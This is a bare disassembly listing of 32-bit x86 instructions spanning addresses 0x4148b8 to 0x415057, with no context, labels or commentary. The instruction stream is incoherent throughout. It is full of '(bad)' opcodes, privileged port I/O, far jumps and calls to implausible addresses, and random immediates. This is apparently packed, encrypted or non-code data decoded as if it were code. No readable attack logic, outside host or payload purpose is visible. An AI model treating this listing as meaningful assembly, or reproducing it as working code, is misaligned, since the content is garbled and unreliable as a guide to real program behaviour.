  4148b8:	test   BYTE PTR [esi-0x31],cl
  4148bb:	pop    edi
  4148bc:	add    edx,DWORD PTR [edi-0x52]
  4148bf:	pop    esp
  4148c0:	adc    BYTE PTR [edx+0x4b],dh
  4148c3:	fdiv   DWORD PTR [ebp-0x239f13b3]
  4148c9:	mov    ebp,0x8ecf51d9
  4148ce:	ret    0x2786
  4148d1:	inc    ebp
  4148d2:	xor    al,BYTE PTR [ecx+0x0]
  4148d5:	xlat   BYTE PTR ds:[ebx]
  4148d6:	mov    esp,0x144e8172
  4148db:	xchg   BYTE PTR [ecx],ah
  4148dd:	xchg   BYTE PTR [ebx],ah
  4148df:	jne    0x414875
  4148e1:	call   0xbb958485
  4148e6:	imul   ebx,DWORD PTR [esi-0x60],0x63802eeb
  4148ed:	or     al,0x94
  4148ef:	in     eax,0x41
  4148f1:	bound  esi,QWORD PTR [eax*1-0x67bca88]
  4148f8:	leave  
  4148f9:	addr16 sahf 
  4148fb:	int3   
  4148fc:	add    al,0x60
  4148fe:	pop    ebx
  4148ff:	jp     0x4148d1
  414901:	push   ds
  414902:	dec    ebx
  414903:	xchg   esp,eax
  414904:	fcom   QWORD PTR [edx]
  414906:	mov    edx,0x19ab0625
  41490b:	fsub   QWORD PTR [edx-0x77b999b3]
  414911:	div    bh
  414913:	ss inc edx
  414915:	jp     0x41493c
  414917:	inc    ah
  414919:	jmp    0x1a89:0x2aa5f0df
  414920:	mov    bl,0x2d
  414922:	xor    BYTE PTR [ecx+0x54315ac3],dh
  414928:	mov    ah,0x32
  41492a:	(bad)  
  41492b:	cmp    BYTE PTR [ecx+0x19dad2b3],al
  414931:	das    
  414932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414933:	or     ebp,DWORD PTR [edx+0x65618538]
  414939:	in     al,0x76
  41493b:	pop    edx
  41493c:	mov    edi,0x65b64525
  414941:	shr    DWORD PTR [ebp+0x5ac40a27],0x3c
  414948:	lock loopne 0x41490f
  41494b:	inc    esi
  41494c:	outs   dx,DWORD PTR ds:[esi]
  41494d:	pop    ecx
  41494e:	cmp    BYTE PTR [ebp+0x54d5a33f],al
  414954:	out    0xe3,al
  414956:	push   ecx
  414957:	stos   DWORD PTR es:[edi],eax
  414958:	clc    
  414959:	add    eax,0x42781708
  41495e:	fwait
  41495f:	nop
  414960:	inc    esp
  414961:	fiadd  WORD PTR [edx+0x1333be08]
  414967:	fist   WORD PTR [edi+0x665f66c7]
  41496d:	add    DWORD PTR [edi+0x3b5209b7],eax
  414973:	mov    edx,0xc039f0b7
  414978:	cmp    dl,BYTE PTR [edx]
  41497a:	ret    
  41497b:	jo     0x41494b
  41497d:	das    
  41497e:	add    ebp,DWORD PTR [eax+ecx*2+0x2a]
  414982:	cli    
  414983:	inc    ebx
  414984:	xchg   ebx,eax
  414985:	fisttp WORD PTR [ebx+0x1f5ddf23]
  41498b:	push   0xdedaaff9
  414990:	mov    eax,ds:0x2a673c9f
  414995:	ja     0x414995
  414997:	ret    
  414998:	cmp    bh,ah
  41499a:	mov    edx,0x60bcb153
  41499f:	push   eax
  4149a0:	(bad)  
  4149a2:	xor    DWORD PTR ds:0x49fb49b4,0xd287c639
  4149ac:	out    dx,eax
  4149ad:	pop    ecx
  4149ae:	out    0xbc,al
  4149b0:	cli    
  4149b1:	retf   0xa70e
  4149b4:	adc    esi,DWORD PTR [edx+0x41185d59]
  4149ba:	out    dx,eax
  4149bb:	out    0xc4,al
  4149bd:	loope  0x414942
  4149bf:	imul   eax,esp,0x28228860
  4149c5:	pop    ss
  4149c6:	mov    esi,edi
  4149c8:	jmp    0x414a2c
  4149ca:	mov    eax,DWORD PTR [esi-0x6ccdfb3c]
  4149d0:	ror    DWORD PTR [edi-0x60be0412],0xea
  4149d7:	dec    edx
  4149d8:	std    
  4149d9:	push   ss
  4149da:	mov    ah,0x98
  4149dc:	gs pop ebx
  4149de:	(bad)  
  4149e0:	push   esp
  4149e1:	push   ds
  4149e2:	and    BYTE PTR [ebx+0x166f2987],dl
  4149e8:	push   edx
  4149e9:	push   0x894748ef
  4149ee:	les    ebp,FWORD PTR [edx]
  4149f0:	popa   
  4149f1:	in     eax,0x5c
  4149f3:	mov    cs,edi
  4149f5:	mov    edx,0x2f6ad570
  4149fa:	cmp    esi,esi
  4149fc:	out    dx,eax
  4149fd:	or     eax,DWORD PTR [eax]
  4149ff:	js     0x414a37
  414a01:	dec    edi
  414a02:	and    BYTE PTR [edi+0x7fd69ded],al
  414a08:	cmp    BYTE PTR [esi],dl
  414a0a:	test   al,0x58
  414a0c:	shr    DWORD PTR [edx+0x7bc1da03],cl
  414a12:	or     ebx,DWORD PTR [edi]
  414a14:	(bad)  
  414a15:	in     al,dx
  414a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a17:	(bad)  
  414a18:	adc    eax,0xae546e4e
  414a1d:	and    BYTE PTR [ecx],cl
  414a1f:	inc    ecx
  414a20:	in     al,0x31
  414a22:	push   eax
  414a23:	mov    ebx,0xc52df463
  414a28:	jae    0x414a97
  414a2a:	leave  
  414a2b:	mov    esp,0x4c88df1b
  414a30:	mov    edi,0x641eb6ca
  414a35:	pop    ebp
  414a36:	mov    eax,ds:0xa258635f
  414a3b:	shr    BYTE PTR [esi],0xd6
  414a3e:	ins    BYTE PTR es:[edi],dx
  414a3f:	mov    ch,0xe4
  414a41:	imul   ecx,DWORD PTR [ebp+0x39],0xfffffff6
  414a45:	mov    cl,0xb4
  414a47:	xlat   BYTE PTR ds:[ebx]
  414a48:	neg    DWORD PTR [edi]
  414a4a:	arpl   WORD PTR ds:0xf40e970f,cx
  414a50:	cmp    al,dh
  414a52:	inc    ecx
  414a53:	ror    al,cl
  414a55:	je     0x4149dd
  414a57:	loop   0x4149df
  414a59:	loop   0x414a90
  414a5b:	ret    
  414a5c:	scas   eax,DWORD PTR es:[edi]
  414a5d:	ja     0x414a70
  414a5f:	hlt    
  414a60:	add    eax,0x82676e0
  414a65:	xchg   esi,eax
  414a66:	push   ds
  414a67:	sub    al,bl
  414a69:	jo     0x4149eb
  414a6b:	mov    cl,BYTE PTR [ebx+eiz*4-0x32]
  414a6f:	popf   
  414a70:	repz pop esp
  414a72:	adc    ebp,DWORD PTR [ecx+0x66]
  414a75:	jno    0x414a9b
  414a77:	ins    DWORD PTR es:[edi],dx
  414a78:	rol    ch,cl
  414a7a:	add    al,0xc3
  414a7c:	mov    BYTE PTR [eax+0x4c],al
  414a7f:	aad    0xdf
  414a81:	jnp    0x414a18
  414a83:	iret   
  414a84:	rol    DWORD PTR [ebx],0x56
  414a87:	addr16 push edi
  414a89:	dec    eax
  414a8a:	outs   dx,DWORD PTR ds:[esi]
  414a8b:	out    0xe1,eax
  414a8d:	and    al,0xa8
  414a8f:	test   eax,0x11ec3760
  414a94:	xor    dh,BYTE PTR [edi+ebp*2-0x79]
  414a98:	fs jmp 0x414ad8
  414a9b:	jl     0x414a9b
  414a9d:	sbb    ebx,DWORD PTR [ebx-0x6a]
  414aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa1:	sar    BYTE PTR [edx+eiz*4-0x63],cl
  414aa5:	out    0x2e,al
  414aa7:	(bad)  
  414aaa:	shl    BYTE PTR [ecx-0x6a68ea53],cl
  414ab0:	add    al,dh
  414ab2:	mov    cl,0xe9
  414ab4:	aas    
  414ab5:	dec    esi
  414ab6:	adc    ebx,ebx
  414ab8:	jns    0x414a56
  414aba:	or     DWORD PTR [edi],esi
  414abc:	mov    ebp,DWORD PTR [esi]
  414abe:	sub    DWORD PTR [edx],esp
  414ac0:	loope  0x414a8c
  414ac2:	xor    bl,BYTE PTR [ebp-0xa830c05]
  414ac8:	out    0x93,eax
  414aca:	push   edi
  414acb:	and    ecx,DWORD PTR [ecx]
  414acd:	ss sar edi,cl
  414ad0:	push   es
  414ad1:	adc    eax,DWORD PTR [esi+esi*8]
  414ad4:	mov    al,0xb4
  414ad6:	jmp    FWORD PTR [esi-0x32]
  414ad9:	out    dx,al
  414ada:	sbb    edi,edi
  414adc:	ror    BYTE PTR [ecx+0x3eb9bd86],1
  414ae2:	pop    esp
  414ae3:	jle    0x414aea
  414ae5:	ds dec ebp
  414ae7:	adc    eax,0xb5d51d53
  414aec:	xchg   ebx,eax
  414aed:	jae    0x414b07
  414aef:	inc    eax
  414af0:	jecxz  0x414b40
  414af2:	(bad)  
  414af3:	outs   dx,DWORD PTR ds:[esi]
  414af4:	iret   
  414af5:	cwde   
  414af6:	test   eax,0xcd33c6b4
  414afb:	stc    
  414afc:	jb     0x414af2
  414afe:	xchg   esp,eax
  414aff:	cwde   
  414b00:	addr16 push es
  414b02:	or     DWORD PTR [ebx+0x6bc9f076],edx
  414b08:	loopne 0x414ad4
  414b0a:	lock mov dh,0xb9
  414b0d:	cmp    DWORD PTR [edi-0x29],edi
  414b10:	mov    cl,0xd4
  414b12:	jne    0x414afe
  414b14:	data16 xor bh,BYTE PTR [edx-0x5f]
  414b18:	sub    al,0xce
  414b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b1b:	aas    
  414b1c:	mov    ah,0x4
  414b1e:	adc    BYTE PTR [edx+0x42f3ec42],dh
  414b24:	mov    ax,ds:0xbb96943d
  414b2a:	jns    0x414acb
  414b2c:	inc    esi
  414b2d:	nop
  414b2e:	loop   0x414b54
  414b30:	xchg   BYTE PTR [ebp-0x13eb5940],cl
  414b36:	mov    ah,0x91
  414b38:	and    ebp,ebp
  414b3a:	fwait
  414b3b:	jle    0x414b47
  414b3d:	and    eax,0x82e601fe
  414b42:	mov    dl,0x9f
  414b44:	xchg   esi,eax
  414b45:	repz cmp BYTE PTR [ebx],ah
  414b48:	ins    BYTE PTR es:[edi],dx
  414b49:	mov    DWORD PTR [ebx+0x7e],esi
  414b4c:	cmc    
  414b4d:	out    0xa2,eax
  414b4f:	push   ds
  414b50:	mov    ds,eax
  414b52:	and    DWORD PTR [ecx+0x53],0x69b7b86
  414b59:	sub    esp,DWORD PTR [eax-0x33]
  414b5c:	dec    ebp
  414b5d:	pop    ebx
  414b5e:	pop    esp
  414b5f:	cmp    edx,DWORD PTR [edx-0x20]
  414b62:	inc    eax
  414b63:	ja     0x414b8a
  414b65:	adc    ah,BYTE PTR [ebp+0xb]
  414b68:	fwait
  414b69:	mov    ds:0xc9219636,al
  414b6e:	rcr    DWORD PTR [ebp-0x60],0xf6
  414b72:	sbb    DWORD PTR [edi],esi
  414b74:	adc    BYTE PTR [edi-0x11fab5b1],0xbe
  414b7b:	ja     0x414be8
  414b7d:	shl    BYTE PTR [edx-0x4a],0x75
  414b81:	mov    ecx,0xb6c5f0a6
  414b86:	sub    dl,dl
  414b88:	repz addr16 pop esi
  414b8b:	inc    edx
  414b8c:	mov    ecx,0xd228fa9b
  414b91:	xchg   edi,eax
  414b92:	jg     0x414b58
  414b94:	pop    edx
  414b95:	cmp    DWORD PTR [ebp-0x77],eax
  414b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b99:	sub    al,0xa
  414b9b:	push   eax
  414b9c:	shl    DWORD PTR [ebp+0x7d],cl
  414b9f:	inc    ebp
  414ba0:	mov    ch,0x34
  414ba2:	std    
  414ba3:	lahf   
  414ba4:	rep stos BYTE PTR es:[edi],al
  414ba6:	cmp    bh,cl
  414ba8:	and    DWORD PTR [ecx+ebx*1-0x77cc3c5f],0x419edf23
  414bb3:	xchg   BYTE PTR [eax-0x6f],ch
  414bb6:	adc    BYTE PTR [eax-0x6777c7d],bl
  414bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bbd:	cli    
  414bbe:	aas    
  414bbf:	dec    edx
  414bc0:	mov    ch,0x95
  414bc2:	push   esi
  414bc3:	jo     0x414b90
  414bc5:	loopne 0x414b4f
  414bc7:	pop    ss
  414bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bc9:	popa   
  414bca:	mov    cl,0xd2
  414bcc:	adc    DWORD PTR [eax+0x5c8221fb],eax
  414bd2:	jl     0x414b6d
  414bd4:	mov    dh,0x34
  414bd6:	jb     0x414bbd
  414bd8:	cs cli 
  414bda:	pop    ss
  414bdb:	jnp    0x414c43
  414bdd:	jne    0x414bd6
  414bdf:	inc    eax
  414be0:	sahf   
  414be1:	mov    DWORD PTR [esp+eax*4+0x3c2f20bc],edx
  414be8:	mov    al,0xb7
  414bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414beb:	xchg   esi,ecx
  414bed:	mov    dl,0xc3
  414bef:	lahf   
  414bf0:	cdq    
  414bf1:	xchg   ebp,eax
  414bf2:	inc    edi
  414bf3:	inc    edx
  414bf4:	pop    es
  414bf5:	cli    
  414bf6:	(bad)  
  414bf7:	ja     0x414c3b
  414bf9:	inc    edx
  414bfa:	stos   DWORD PTR es:[edi],eax
  414bfb:	bound  edx,QWORD PTR [esi+0x43]
  414bfe:	push   esp
  414bff:	retf   
  414c00:	pop    esi
  414c01:	ja     0x414c19
  414c03:	call   0x5a795019
  414c08:	or     BYTE PTR [eax],0x9b
  414c0b:	cdq    
  414c0c:	push   edi
  414c0d:	cmp    eax,0xbe8914ee
  414c12:	push   esi
  414c13:	mov    esi,0xc0f116fb
  414c18:	pop    ds
  414c19:	or     eax,0x7dcbc1b7
  414c1e:	in     al,0x96
  414c20:	xlat   BYTE PTR ds:[ebx]
  414c21:	iret   
  414c22:	pop    eax
  414c23:	and    DWORD PTR [ebx-0x5a99100e],esp
  414c29:	jb     0x414c2b
  414c2b:	mov    bh,0x67
  414c2d:	add    al,0x4d
  414c2f:	cs inc esi
  414c31:	adc    BYTE PTR [eax+0x24],dl
  414c34:	jl     0x414c5f
  414c36:	mov    edx,0x9204d032
  414c3b:	sbb    ebp,DWORD PTR [ecx+0x267f0416]
  414c41:	adc    DWORD PTR [edx-0x49869b8a],ebp
  414c47:	mov    ds:0x60acf6c4,al
  414c4c:	jbe    0x414be7
  414c4e:	push   es
  414c4f:	or     bh,BYTE PTR [ebp+0x3a]
  414c52:	leave  
  414c53:	ins    DWORD PTR es:[edi],dx
  414c54:	int3   
  414c55:	inc    esp
  414c56:	sub    bh,al
  414c58:	fild   QWORD PTR [ecx]
  414c5a:	push   ss
  414c5b:	jmp    0xe0cea9a2
  414c60:	leave  
  414c61:	sub    ebx,eax
  414c63:	push   cs
  414c64:	or     ebx,eax
  414c66:	loopne 0x414cbc
  414c68:	xchg   BYTE PTR [esi+0x1a85ca6c],bl
  414c6e:	push   edx
  414c6f:	xchg   esp,eax
  414c70:	and    BYTE PTR [eax+0x2b],dh
  414c73:	aad    0x61
  414c75:	jp     0x414c4d
  414c77:	sbb    ah,bl
  414c79:	dec    eax
  414c7a:	int3   
  414c7b:	fidivr WORD PTR [eax]
  414c7d:	sti    
  414c7e:	nop
  414c7f:	mov    ebp,0x50b054e5
  414c84:	or     cl,al
  414c86:	arpl   WORD PTR [edi-0x2f],bp
  414c89:	int3   
  414c8a:	fs push ss
  414c8c:	mov    ebx,0x586cc001
  414c91:	add    ah,BYTE PTR [ebx]
  414c93:	jle    0x414c1c
  414c95:	ficomp WORD PTR [edi-0x4d]
  414c98:	cmp    eax,0xee1d7c50
  414c9d:	xor    ebp,DWORD PTR [eax-0x11f20a31]
  414ca3:	fst    DWORD PTR [ebx+0x74]
  414ca6:	inc    ebp
  414ca7:	rdpmc  
  414ca9:	test   BYTE PTR [edi],dh
  414cab:	push   edi
  414cac:	push   ds
  414cad:	jge    0x414c5b
  414caf:	jae    0x414c5a
  414cb1:	jbe    0x414ce1
  414cb3:	dec    ebx
  414cb4:	mov    eax,ds:0x68322080
  414cb9:	cld    
  414cba:	sub    DWORD PTR [ebp-0x45],eax
  414cbd:	xor    eax,0x71487669
  414cc2:	mov    edx,DWORD PTR [edi-0x5f243dea]
  414cc8:	dec    esi
  414cc9:	cld    
  414cca:	hlt    
  414ccb:	test   BYTE PTR [edi],0x73
  414cce:	pop    esp
  414ccf:	dec    esi
  414cd0:	pop    esp
  414cd1:	push   cs
  414cd2:	and    DWORD PTR [edx-0x56254c08],edi
  414cd8:	hlt    
  414cd9:	(bad)  
  414cda:	pusha  
  414cdb:	ret    
  414cdc:	jne    0x414d18
  414cde:	aas    
  414cdf:	cmp    dl,cl
  414ce1:	pop    ebx
  414ce2:	cmc    
  414ce3:	imul   ebp,DWORD PTR ds:[edx+0x69],0xede95359
  414ceb:	and    al,BYTE PTR [esi+0x38594dc7]
  414cf1:	jo     0x414d6f
  414cf3:	cmp    dh,BYTE PTR [ebx]
  414cf5:	fsubr  DWORD PTR [ecx+0x75]
  414cf8:	(bad)  
  414cf9:	std    
  414cfa:	or     eax,0x70c192b7
  414cff:	add    al,0x53
  414d01:	xchg   esp,eax
  414d02:	push   0xffffffb5
  414d04:	add    al,0x71
  414d06:	int    0xd7
  414d08:	dec    eax
  414d09:	in     al,0xe9
  414d0b:	inc    esp
  414d0c:	lods   al,BYTE PTR ds:[esi]
  414d0d:	xor    al,0x8a
  414d0f:	xor    eax,0xbd3b84ba
  414d14:	bound  edi,QWORD PTR fs:[ebp-0x70]
  414d18:	xchg   ecx,eax
  414d19:	sbb    ch,BYTE PTR [ebx+0x5c]
  414d1c:	xchg   DWORD PTR [edi+0x66],esp
  414d1f:	cmp    DWORD PTR [eax+0x72006501],0x72d0ef2a
  414d29:	fldcw  WORD PTR [ebx+0x5c3b87e4]
  414d2f:	arpl   WORD PTR [ebp-0x22],si
  414d32:	(bad)  
  414d34:	int    0xaf
  414d36:	adc    al,0x75
  414d38:	inc    ebp
  414d39:	xor    BYTE PTR [edx-0x2],ah
  414d3c:	push   esi
  414d3d:	leave  
  414d3e:	mov    edx,DWORD PTR [ecx+0x3f]
  414d41:	int    0x14
  414d43:	std    
  414d44:	mov    WORD PTR [ebx],ss
  414d46:	jno    0x414d21
  414d48:	xor    BYTE PTR [eax],al
  414d4a:	xlat   BYTE PTR es:[ebx]
  414d4c:	and    BYTE PTR ds:0x8d67c68e,dh
  414d52:	and    DWORD PTR [ebp+0x7778dc5f],0xffffff91
  414d59:	add    al,0xdd
  414d5b:	mov    ecx,DWORD PTR [edx-0x4a4b1c06]
  414d61:	inc    edi
  414d62:	into   
  414d63:	or     BYTE PTR [ecx+0x49],dh
  414d66:	or     al,0xa9
  414d68:	jge    0x414d00
  414d6a:	mov    ds:0x1be39428,eax
  414d6f:	rol    BYTE PTR ds:0x30a12a47,0xe
  414d76:	pop    ss
  414d77:	mov    bh,BYTE PTR [edx]
  414d79:	inc    esi
  414d7a:	aad    0xc0
  414d7c:	inc    edi
  414d7d:	pushf  
  414d7e:	sbb    edx,edx
  414d80:	arpl   WORD PTR [esi+0x3a],dx
  414d83:	jmp    0x414d6a
  414d85:	pop    esi
  414d86:	lea    eax,[eax+ecx*1-0x1b]
  414d8a:	dec    ebx
  414d8b:	rol    BYTE PTR [esi],0x40
  414d8e:	pop    edi
  414d8f:	in     al,dx
  414d90:	fadd   DWORD PTR [edx-0x4e]
  414d93:	jmp    0x49c8ceaf
  414d98:	pop    es
  414d99:	xchg   ebx,eax
  414d9a:	push   ds
  414d9b:	fs out 0xdf,eax
  414d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d9f:	add    DWORD PTR [eax-0x68],0x6a82bc60
  414da6:	les    ebp,FWORD PTR [ebx-0x5c]
  414da9:	lods   eax,DWORD PTR ds:[esi]
  414daa:	push   ecx
  414dab:	jne    0x414d89
  414dad:	push   edi
  414dae:	cs pop es
  414db0:	pop    esi
  414db1:	jge    0x414d97
  414db3:	pop    esp
  414db4:	fcom   QWORD PTR [esi+eiz*1-0x3202b871]
  414dbb:	pop    ebp
  414dbc:	outs   dx,DWORD PTR ds:[esi]
  414dbd:	inc    edx
  414dbe:	jae    0x414d74
  414dc0:	cwde   
  414dc1:	ret    0x67cd
  414dc4:	pop    ebx
  414dc5:	icebp  
  414dc6:	in     eax,0x5e
  414dc8:	adc    BYTE PTR ds:0x780695e0,bl
  414dce:	xchg   esi,eax
  414dcf:	loopne 0x414d74
  414dd1:	and    ebx,DWORD PTR [ebp+eiz*4+0x3b3b682d]
  414dd8:	sub    eax,edx
  414dda:	xor    DWORD PTR [ecx+0x4d],edi
  414ddd:	mov    dl,0xe5
  414ddf:	daa    
  414de0:	bound  esp,QWORD PTR [ebx-0x54677e79]
  414de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de7:	fwait
  414de8:	dec    esp
  414de9:	clc    
  414dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414deb:	jmp    DWORD PTR [ebx+0x68541a45]
  414df1:	std    
  414df2:	mov    ds:0x413f06d6,eax
  414df7:	cmp    DWORD PTR [eax+0x331057a3],0xffffffb4
  414dfe:	(bad)  
  414dff:	fsub   st(7),st
  414e01:	sub    ecx,eax
  414e03:	pop    es
  414e04:	jmp    0x819d7f42
  414e09:	aaa    
  414e0a:	aas    
  414e0b:	rcr    DWORD PTR [esi-0x926dc06],0x51
  414e12:	and    BYTE PTR [esi+0x18],dh
  414e15:	jg     0x414e52
  414e17:	inc    edx
  414e18:	sbb    DWORD PTR [ecx-0x51d2fe07],0xffffff9b
  414e1f:	push   ss
  414e20:	push   ebp
  414e21:	test   DWORD PTR [esi+0x5e],edi
  414e24:	(bad)  [ebp+0x7a470b7d]
  414e2a:	(bad)  
  414e2b:	cmp    ebx,DWORD PTR [edi+0x20d92c86]
  414e31:	or     DWORD PTR [ebp+0x26995fc6],esp
  414e37:	inc    edx
  414e38:	call   0x3be10834
  414e3d:	cmp    ah,BYTE PTR [esp+ebp*4]
  414e40:	push   esi
  414e41:	push   0xb05a81d0
  414e46:	js     0x414e86
  414e48:	ja     0x414e72
  414e4a:	sub    bh,al
  414e4c:	push   esp
  414e4d:	mov    ch,0x94
  414e4f:	fisubr DWORD PTR [esi+0x7f806445]
  414e55:	push   eax
  414e56:	adc    al,cl
  414e58:	xor    edi,edi
  414e5a:	and    BYTE PTR [edi+ebx*8+0x5c123f3b],cl
  414e61:	pop    ss
  414e62:	jno    0x414e0f
  414e64:	fstp   TBYTE PTR [esi+0x19]
  414e67:	jecxz  0x414ebf
  414e69:	aam    0x6f
  414e6b:	(bad)  
  414e6c:	push   cs
  414e6d:	iret   
  414e6e:	jl     0x414ec5
  414e70:	xor    al,dh
  414e72:	test   al,0x88
  414e74:	(bad)  
  414e75:	repz push ecx
  414e77:	jge    0x414e66
  414e79:	mov    bl,0x66
  414e7b:	mov    edx,0x8983ba15
  414e80:	aam    0xee
  414e82:	cmp    al,BYTE PTR [edx+edi*8-0x2c]
  414e86:	mov    al,ds:0x40dedaa6
  414e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e8c:	pop    ecx
  414e8d:	adc    bh,0x62
  414e90:	jmp    0x6fabc629
  414e95:	mov    edx,0x8d5651e4
  414e9a:	push   cs
  414e9b:	lea    edx,[esi]
  414e9d:	call   0x7b36f694
  414ea2:	mov    WORD PTR [eax-0x58e2e567],gs
  414ea8:	mov    ebp,edi
  414eaa:	sbb    ch,BYTE PTR [ecx]
  414eac:	dec    edx
  414ead:	jns    0x94155432
  414eb3:	add    BYTE PTR [eax-0x6b],cl
  414eb6:	ins    BYTE PTR es:[edi],dx
  414eb7:	and    BYTE PTR [ecx],ah
  414eb9:	mov    esp,0x13522f89
  414ebe:	xor    al,0x4e
  414ec0:	add    DWORD PTR [edi+0x3695541a],esp
  414ec6:	ins    DWORD PTR es:[edi],dx
  414ec7:	fincstp 
  414ec9:	or     al,0x39
  414ecb:	das    
  414ecc:	push   edi
  414ecd:	and    eax,0x3446c95
  414ed2:	jecxz  0x414ed2
  414ed4:	mov    cl,0xf3
  414ed6:	xchg   edx,eax
  414ed7:	or     BYTE PTR [eax+0x0],ch
  414eda:	inc    edx
  414edb:	sub    esi,DWORD PTR [edi-0x23]
  414ede:	mov    ds:0x6a519d0a,eax
  414ee3:	aad    0x26
  414ee5:	pop    ebx
  414ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee7:	or     DWORD PTR [edi-0x16e4f7e8],edx
  414eed:	or     al,0x84
  414eef:	sbb    edx,ecx
  414ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ef2:	fisubr WORD PTR [edx+esi*1]
  414ef5:	loopne 0x414f46
  414ef7:	lahf   
  414ef8:	es cmp eax,0xfe3d27c5
  414efe:	push   ss
  414eff:	mov    al,0xfe
  414f01:	sub    DWORD PTR [ecx+0x5d],eax
  414f04:	addr16 icebp 
  414f06:	jle    0x414f09
  414f08:	xlat   BYTE PTR ds:[ebx]
  414f09:	dec    ebp
  414f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0b:	shl    DWORD PTR [edx],1
  414f0d:	push   0xffffffb8
  414f0f:	and    esi,DWORD PTR ds:0x3b1a7768
  414f15:	adc    ch,dh
  414f17:	cmp    esp,esi
  414f19:	(bad)  
  414f1a:	pop    ebx
  414f1b:	xlat   BYTE PTR ds:[ebx]
  414f1c:	aad    0x31
  414f1e:	and    ebx,DWORD PTR [edi+eiz*4]
  414f21:	or     DWORD PTR [eax],edi
  414f23:	dec    eax
  414f24:	int3   
  414f25:	jno    0x414ef6
  414f27:	out    dx,eax
  414f28:	xlat   BYTE PTR ds:[bx]
  414f2a:	(bad)  
  414f2b:	mov    ecx,0xc8086438
  414f30:	out    0xa3,eax
  414f32:	adc    al,0x4b
  414f34:	mov    si,0x9d56
  414f38:	pop    ecx
  414f39:	mov    cl,0x95
  414f3b:	or     eax,0xc5154913
  414f40:	enter  0x7698,0x9e
  414f44:	sbb    bh,BYTE PTR [esi]
  414f46:	in     eax,dx
  414f47:	inc    ebx
  414f48:	pop    ss
  414f49:	sbb    dh,BYTE PTR [ecx+0x12179f7]
  414f4f:	push   0x4e
  414f51:	adc    eax,DWORD PTR [ecx]
  414f53:	mov    ds:0xa948cdd4,eax
  414f58:	cli    
  414f59:	fucom  st(4)
  414f5b:	push   eax
  414f5c:	inc    edi
  414f5d:	sbb    eax,0xdb53b805
  414f62:	fcomp  DWORD PTR [edi]
  414f64:	add    ebp,ebp
  414f66:	push   0xffffffef
  414f68:	imul   BYTE PTR [edx]
  414f6a:	aam    0x74
  414f6c:	inc    ebp
  414f6d:	dec    esi
  414f6e:	nop
  414f6f:	out    dx,al
  414f70:	jb     0x414f94
  414f72:	add    al,0x88
  414f74:	xor    DWORD PTR [ebp-0x4c2af9f6],esp
  414f7a:	test   BYTE PTR [ebx],al
  414f7c:	and    edi,DWORD PTR [ebp-0x3dff728]
  414f82:	inc    esi
  414f83:	lock outs dx,BYTE PTR ds:[esi]
  414f85:	xchg   edx,eax
  414f86:	imul   esi,eax,0xffffff88
  414f89:	(bad)  
  414f8a:	sub    DWORD PTR [edi],eax
  414f8c:	cmp    BYTE PTR [ecx-0x37],bl
  414f8f:	adc    esi,DWORD PTR [eax]
  414f91:	or     ebp,DWORD PTR [eax+0x7]
  414f94:	test   eax,0x5b4d0304
  414f99:	jo     0x414ff3
  414f9b:	loop   0x415012
  414f9d:	sub    al,0x8b
  414f9f:	adc    edx,DWORD PTR [edi-0x677faeba]
  414fa5:	push   eax
  414fa6:	test   al,0x14
  414fa8:	sbb    al,ah
  414faa:	adc    BYTE PTR [ebx-0x4a],dl
  414fad:	lahf   
  414fae:	cmp    eax,0xde65657c
  414fb3:	adc    eax,0x58a1a46a
  414fb8:	retw   
  414fba:	call   0x26cf9c38
  414fbf:	jl     0x414f5f
  414fc1:	mov    ah,0xb7
  414fc3:	or     al,0x3
  414fc5:	push   0xd44da0db
  414fca:	xor    ebp,ecx
  414fcc:	daa    
  414fcd:	pop    ecx
  414fce:	es push esp
  414fd0:	fbstp  TBYTE PTR [ebp-0x772da138]
  414fd6:	(bad)  
  414fd7:	adc    eax,0x6bf6ca75
  414fdc:	or     dl,al
  414fde:	cmp    DWORD PTR [edi+0x6146e159],0x5566e9c9
  414fe8:	inc    ebp
  414fe9:	mov    bh,BYTE PTR [eax]
  414feb:	ret    0xcd22
  414fee:	push   edi
  414fef:	jl     0x414fa8
  414ff1:	pop    edi
  414ff2:	loopne 0x414fa3
  414ff4:	loopne 0x414faa
  414ff6:	sbb    BYTE PTR [ebp+0x50386ca7],0x26
  414ffd:	jnp    0x415055
  414fff:	mov    ebp,0x36fab16
  415004:	sbb    DWORD PTR [edi+edi*1],esp
  415007:	adc    BYTE PTR [ebx-0x72],cl
  41500a:	repz push ecx
  41500c:	rol    ecx,1
  41500e:	out    dx,eax
  41500f:	jnp    0x41501f
  415011:	(bad)  
  415012:	jle    0x415018
  415014:	hlt    
  415015:	cmp    BYTE PTR [esi-0x440da7b5],ch
  41501b:	scas   eax,DWORD PTR es:[edi]
  41501c:	jp     0x415004
  41501e:	jmp    0x414fd8
  415020:	xchg   BYTE PTR [esi+ebx*2-0x7fe9e08e],ch
  415027:	pushf  
  415028:	aaa    
  415029:	ins    BYTE PTR es:[edi],dx
  41502a:	ret    0x6f79
  41502d:	jbe    0x415073
  41502f:	dec    edx
  415030:	cmp    al,0x96
  415032:	(bad)  
  415033:	leave  
  415034:	push   0xffffffa6
  415036:	sub    eax,DWORD PTR [edx]
  415038:	mov    edi,0xf400fe24
  41503d:	add    al,0x14
  41503f:	mov    al,ds:0xfe9975bc
  415044:	stos   BYTE PTR es:[edi],al
  415045:	and    BYTE PTR [ebp-0x3c1af271],ch
  41504b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41504c:	loop   0x41508c
  41504e:	outs   dx,DWORD PTR ds:[esi]
  41504f:	adc    ebp,DWORD PTR [ecx-0x7a7dfe3d]
  415055:	or     esi,edx
  415057:	gs push ebx
